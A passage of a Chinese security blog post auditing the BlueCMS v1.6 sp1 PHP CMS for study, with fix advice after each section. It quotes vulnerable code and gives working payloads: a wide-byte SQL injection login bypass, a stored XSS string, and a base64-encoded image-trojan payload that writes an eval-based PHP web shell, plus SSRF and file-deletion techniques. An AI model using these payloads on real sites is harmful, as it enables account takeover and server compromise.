class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line"> 	<span class="keyword">if</span>($row[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">else</span></span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pwd</code> 需要 md5 加密，我们选择 <code>admin_name</code> 这个参数进行注入测试万能密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name&#x3D;landv%df&#39; or 1&#x3D;1#&amp;admin_pwd&#x3D;123</span><br></pre></td></tr></table></figure><p>拼接效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="keyword">num</span> <span class="keyword">FROM</span> blue_admin <span class="keyword">WHERE</span> admin_name=<span class="string">&#x27;landv%df\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">#&#x27; and pwd = md5(&#x27;123&#x27;)</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/01/N9CYy3cStbmvAnz.png" alt=""></p><p>同理，uploads/user.php 用户登录界面也存在这样的问题（包含了相同的函数文件）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user_name  	= 	!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;user_name&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;user_name&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$pwd 			= 	!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;pwd&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;pwd&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line">$row = $db-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$user_name</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p>区别是有验证码，但也就只限制了批量登录。</p><p><img src="https://i.loli.net/2020/12/01/e5AFaoGId1iPMV2.png" style="zoom:80%"></p><p>这里因为 admin 是 user 表的第一条数据，我们可以调整 <code>1=1</code> 的数值登录所有用户。</p><p>用户注册界面同样能行，但用户名有长度限制 4~16：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($user_name) &lt; <span class="number">4</span> || strlen($user_name) &gt; <span class="number">16</span>)&#123;</span><br><span class="line">	showmsg(<span class="string">&#x27;用户名字符长度不符&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但邮箱可以利用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$email     		= 	!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;email&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;email&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#x27;&#x27;, &#x27;<span class="subst">$user_name</span>&#x27;, md5(&#x27;<span class="subst">$pwd</span>&#x27;), &#x27;<span class="subst">$email</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>insert 注入可以参考上面的 XFF 注入 payload，这里是宽字节，可以尝试 insert 插入两条数据。</p><p><strong>修复建议</strong></p><p>对于宽字节编码，有一种最好的修补就是：</p><ul><li><p>使用 <code>mysql_set_charset</code> (GBK) 指定字符集</p></li><li><p>使用 <code>mysql_real_escape_string</code> 进行转义</p></li></ul><p>原理是，<code>mysql_real_escape_string</code> 与 <code>addslashes</code> 的不同之处在于其会考虑当前设置的字符集，不会出现前面 e5 和5c 拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</p><p>就是使用 <code>mysql_set_charset</code> 进行指定。</p><p>上述的两个条件是“与”运算的关系，少一条都不行。</p><h3 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h3><h4 id="普通-SQL-注入漏洞"><a href="#普通-SQL-注入漏洞" class="headerlink" title="普通 SQL 注入漏洞"></a>普通 SQL 注入漏洞</h4><p>从最开始的功能板块图就能看出来，添加数据的功能有很多，但有没有对数据消毒就是另一回事了。</p><p>uploads/admin/nav.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act==<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">&quot;select * from &quot;</span>.table(<span class="string">&#x27;navigate&#x27;</span>).<span class="string">&quot; where navid = &quot;</span>.$_GET[<span class="string">&#x27;navid&#x27;</span>];</span><br><span class="line">	$nav = $db-&gt;getone($sql);</span><br><span class="line">	$smarty-&gt;assign(<span class="string">&#x27;nav&#x27;</span>,$nav);</span><br><span class="line">	$smarty-&gt;assign(<span class="string">&#x27;act&#x27;</span>, $act	);</span><br><span class="line">	$smarty-&gt;display(<span class="string">&#x27;nav_info.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接拼接 <code>$_GET[&#39;navid&#39;]</code></p><p>uploads/admin/attachment.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($_REQUEST[<span class="string">&#x27;act&#x27;</span>] == <span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">&quot;DELETE FROM &quot;</span>.table(<span class="string">&#x27;attachment&#x27;</span>).<span class="string">&quot; WHERE att_id = &quot;</span>.$_GET[<span class="string">&#x27;att_id&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(!$db-&gt;query($sql))&#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;删除附加属性出错&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	showmsg(<span class="string">&#x27;删除附加属性成功&#x27;</span>,<span class="string">&#x27;attachment.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接拼接 <code>$_GET[&#39;att_id&#39;]</code></p><p>etc.</p><p><strong>修复建议</strong></p><p>麻烦直接用 PDO 谢谢</p><h2 id="XSS-漏洞"><a href="#XSS-漏洞" class="headerlink" title="XSS 漏洞"></a>XSS 漏洞</h2><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>上边我们注意到 uploads/user.php 注册输入的参数只经过 <code>trim</code>、<code>addslashes</code> 消毒，我们现在来考虑其是否存在存储型 XSS ，因为用户名有长度限制，我们来考虑邮箱。</p><p><img src="https://i.loli.net/2020/12/05/dpA17ZUiwR4xhcQ.png" style="zoom:80%"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_email</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> pattern = <span class="regexp">/^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(.[a-zA-Z0-9_-])+/</span>;</span><br><span class="line">	<span class="keyword">if</span> (!pattern.test(<span class="built_in">document</span>.reg_form.email.value)) &#123;</span><br><span class="line">		msg = <span class="string">&quot;&lt;span style=&#x27;color:red&#x27;&gt;邮箱格式不正确&lt;/span&gt;&quot;</span>;</span><br><span class="line">		$(<span class="string">&quot;check_email_warning&quot;</span>).innerHTML = msg;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		msg = <span class="string">&quot;&lt;span style=&#x27;color:#006CCE&#x27;&gt;邮箱格式正确&lt;/span&gt;&quot;</span>;</span><br><span class="line">		$(<span class="string">&quot;check_email_warning&quot;</span>).innerHTML = msg;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上，前端正则匹配很严格，我们抓包来修改数据绕过：</p><p><img src="https://i.loli.net/2020/12/05/DWikwMObPx6aXoB.png"></p><p>我们再登录访问会员中心：</p><p><img src="https://i.loli.net/2020/12/05/LA1VU3Bo6XZz9Kl.png" style="zoom:80%"></p><p>同样的在 uploads/user.php 发布新闻功能中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;content&#x27;</span>]) ? filter_data($_POST[<span class="string">&#x27;content&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>uploads/include/common.fun.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_data</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$str = preg_replace(<span class="string">&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;</span>, <span class="string">&quot;&quot;</span>, $str);</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/articles/web/157589.html">挖洞经验 | 可以被XSS利用的HTML标签和一些手段技巧</a> ，如 <code>script</code> 等被 ban 情况下绕过方式。</p><p>虽然 ban 了很多标签，但 img 还是漏了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/05/l3Ov4D7M2raiNFx.png"></p><p><img src="https://i.loli.net/2020/12/05/YKuvRLck1xi9Nps.png" style="zoom:80%"></p><p><strong>修复建议</strong></p><p>限制邮箱长度，过滤邮箱输入里的非法字符，传输过程加密，不输出报错内容。</p><h2 id="文件漏洞-getshell"><a href="#文件漏洞-getshell" class="headerlink" title="文件漏洞 getshell"></a>文件漏洞 getshell</h2><p>uploads/user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">&#x27;pay&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;data/pay.cache.php&#x27;</span>;</span><br><span class="line">	$price = $_POST[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">	$id = $_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	$name = $_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">&#x27;pay&#x27;</span>])) &#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;对不起，您没有选择支付方式&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;include/payment/&#x27;</span>.$_POST[<span class="string">&#x27;pay&#x27;</span>].<span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件路径是直接拼接，但后面还有 <code>/index.php</code> ，我们可以考虑 <code>%00</code> 截断。</p><p>限制条件：PHP &lt; 5.3.29，且 GPC 关闭</p><p>和本文一开始的 PHP 版本不同注意了，先改动 PHP 版本再来复现。</p><p>具体可以参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://my.oschina.net/u/4587690/blog/4470406">这篇文章</a>，这里不明白是不是支付缓存文件丢失的原因，抓不到相应的包，修改代码也无济于事，故只从代码角度复现漏洞。</p><p>另外 <code>%00</code> 截断，除了修改 Request 中 HEX 形式的 20 为 00 以外，还可以直接 <code>%00</code> 选中，进行 URL 解码。</p><p>用户资料有可上传头像，我们先看上传部分是否有消毒：</p><p>uploads/user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;face_pic2&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &amp;&amp; $_FILES[<span class="string">&#x27;face_pic2&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">	$face_pic = $image-&gt;img_upload($_FILES[<span class="string">&#x27;face_pic2&#x27;</span>],<span class="string">&#x27;face_pic&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uploads/include/upload.class.php</p><p>注释部分为对应源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">img_upload</span>(<span class="params">$file, $dir = <span class="string">&#x27;&#x27;</span>, $imgname = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($dir))&#123;</span><br><span class="line">    	$dir = BLUE_ROOT.DATA.UPLOAD.date(<span class="string">&quot;Ym&quot;</span>).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	$dir = BLUE_ROOT.DATA.UPLOAD.$dir.<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//	private $allow_image_type = array(&#x27;image/jpeg&#x27;, &#x27;image/gif&#x27;, &#x27;image/png&#x27;, &#x27;image/pjpeg&#x27;);</span></span><br><span class="line">	<span class="keyword">if</span>(!in_array($file[<span class="string">&#x27;type&#x27;</span>],<span class="keyword">$this</span>-&gt;allow_image_type))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;不允许的图片类型&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($imgname))&#123;</span><br><span class="line">    	$imgname = <span class="keyword">$this</span>-&gt;create_tempname().<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;get_type($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//function create_tempname()&#123;</span></span><br><span class="line">    <span class="comment">//	return time().mt_rand(0,9);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    	<span class="keyword">if</span>(!mkdir($dir))&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;上传过程中创建目录失败&lt;/font&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $imgname = $dir . $imgname;</span><br><span class="line"></span><br><span class="line">   	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;uploading($file[<span class="string">&#x27;tmp_name&#x27;</span>], $imgname))&#123;</span><br><span class="line">   		<span class="keyword">return</span> str_replace(BLUE_ROOT, <span class="string">&#x27;&#x27;</span>, $imgname);</span><br><span class="line">   	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;上传图片失败&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">   	&#125;</span><br><span class="line">    <span class="comment">//if($this-&gt;uploading($file[&#x27;tmp_name&#x27;], $imgname))&#123;</span></span><br><span class="line">    <span class="comment">//	return str_replace(BLUE_ROOT, &#x27;&#x27;, $imgname);</span></span><br><span class="line">    <span class="comment">//&#125;else&#123;</span></span><br><span class="line">    <span class="comment">//	echo &#x27;&lt;font style=&quot;color:red;&quot;&gt;上传图片失败&lt;/font&gt;&#x27;;</span></span><br><span class="line">	<span class="comment">//	exit;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为是随机生成的文件名，如果要 getshell 需要我们想办法写一个图片马，创建我们自己的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @fputs(fopen(base64_decode(<span class="string">&#x27;bXVtYS5waHA=&#x27;</span>),w),base64_decode(<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWyd3ayddKTs/Pg==&#x27;</span>));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//bXVtYS5waHA=  -&gt;  muma.php</span></span><br><span class="line"><span class="comment">//PD9waHAgQGV2YWwoJF9QT1NUWyd3ayddKTs/Pg==  -&gt;  <span class="meta">&lt;?php</span> @eval($_POST[&#x27;wk&#x27;]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这是 payload ，不过个人觉得即使不用编码也可以写进去。</p><p><strong>修复建议</strong></p><p>对 pay 过滤，图片不显示具体路径，并二次渲染。</p><h2 id="SSRF-漏洞"><a href="#SSRF-漏洞" class="headerlink" title="SSRF 漏洞"></a>SSRF 漏洞</h2><p>uploads/user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;face_pic1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($_POST[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;http://&#x27;</span>) != <span class="literal">false</span> &amp;&amp; strpos($_POST[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;https://&#x27;</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">        showmsg(<span class="string">&#x27;只支持本站相对路径地址&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $face_pic = trim($_POST[<span class="string">&#x27;face_pic1&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(file_exists(BLUE_ROOT.$_POST[<span class="string">&#x27;face_pic3&#x27;</span>]))&#123;</span><br><span class="line">		@unlink(BLUE_ROOT.$_POST[<span class="string">&#x27;face_pic3&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是用户个人资料的用户头像链接输入。</p><p><img src="https://i.loli.net/2020/12/05/y9xPR3QTUshuX6k.png" style="zoom:80%"></p><p>注意这里没有用 <code>!==</code> ，是 PHP 弱比较，根据 <code>strpos()</code>返回值为 0 是和 false 相等的，故能够绕过造成SSRF漏洞。</p><h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><p>跟 SSRF 的问题代码一样，我们注意到 else 分支是有 <code>unlink</code> 的，通过使用户头像那一栏为空，我们可以删除 <code>face_pic3</code> 对应文件。</p><p>根目录创建 delete.php 。</p><p><img src="https://i.loli.net/2020/12/05/jKH4pb6QnaXwMz2.png" alt=""></p><p>另外全局搜索还有很多 <code>unlink</code> 之类的，就不一一列举了，另外还有很多修改 / 读取的漏洞，同样原理。</p><p><strong>修复建议</strong></p><ol><li>统一文件夹存放</li><li>数据库记录存储路径</li><li>对于入库记录进行严格的防注入和文件上传检测，采用白名单方式来检查后缀，黑名单过滤上跳等操作，严格做到数据库与文件同步</li><li>能用云存储就用，实在不能用在自己写</li><li>尽量少的使用文件删除功能</li></ol><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实还有很多变量覆盖漏洞，但是此类漏洞若不与其他漏洞组合是无法发挥更大作用的，combo 是最重要的（hero 就是要呼朋引伴超融合</p><p>个人觉得拿到一个环境前，先做功能模块导图是个好习惯，记录下比如用户可以上传文件之类的地方，果不其然，在文中大部分相应漏洞都能对得上。这就好比恐解 RPG 游戏中，事先做一份地图比无头苍蝇一样到处乱撞触发 flag 要强 :-)</p><p>再说 CMS 审计流程，这次是跟着复现 blog 走过场的，但觉得意义并不大，毕竟还是要独立行走，主要是缺少了自己对项目代码的<strong>熟悉度</strong>！所以还是要吸取教训不能一味跟着博客走，博客也是别人自己琢磨出来的！</p><p>Seay 其实给了明确的方向了，指出有哪些漏洞，就跟着回溯变量看问题所在，法师的那本书一定要当作圣典过几周目。</p><p>比如有一个函数有漏洞，就如 SQL 注入里的 <code>deep_addslashes</code> 这个函数，有一处可打，就全部可打。</p><p>同时给出修复建议我觉得也是很好的习惯，做安全不能只做攻击者，我们审计的目的是为了修复它。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://xz.aliyun.com/t/7074#toc-10">bluecms v1.6 sp1 代码审计 - 先知社区 (aliyun.com)</a></p></div><div class="popular-posts-header">推荐文章</div><ul class="popular-posts"><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\c46ecd7.html" rel="bookmark">每周审计之ZZCMS v8.2 复现</a></div></li><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\5856e475.html" rel="bookmark">2020 SquareCTF Web 复现记录</a></div></li><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\d8b7f817.html" rel="bookmark">CTF中的SQLite合集</a></div></li></ul><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>landvsec</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://landvsec.top/archives/ebbdc35f.html" title="每周审计之BlueCMS v1.6 sp1复现">https://landvsec.top/archives/ebbdc35f.html</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-tags"><a href="/tags/PHP%E5%AE%A1%E8%AE%A1/" rel="tag"># PHP审计</a></div><div class="post-nav"><div class="post-nav-item"><a href="/archives/5856e475.html" rel="prev" title="2020 SquareCTF Web 复现记录"><i class="fa fa-chevron-left"></i> 2020 SquareCTF Web 复现记录</a></div><div class="post-nav-item"><a href="/archives/9041ce26.html" rel="next" title="PHPStorm+PHPStudy+Xdebug 配置2020详细教程">PHPStorm+PHPStudy+Xdebug 配置2020详细教程 <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.</span> <span class="nav-text">审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.</span> <span class="nav-text">SQL 注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">前台</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%99%AE%E9%80%9A-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">普通 SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XFF-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">XFF 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0"><span class="nav-number">2.1.2.</span> <span class="nav-text">后台</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%99%AE%E9%80%9A-SQL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">普通 SQL 注入漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.</span> <span class="nav-text">XSS 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="nav-number">2.2.1.</span> <span class="nav-text">存储型 XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E-getshell"><span class="nav-number">2.3.</span> <span class="nav-text">文件漏洞 getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 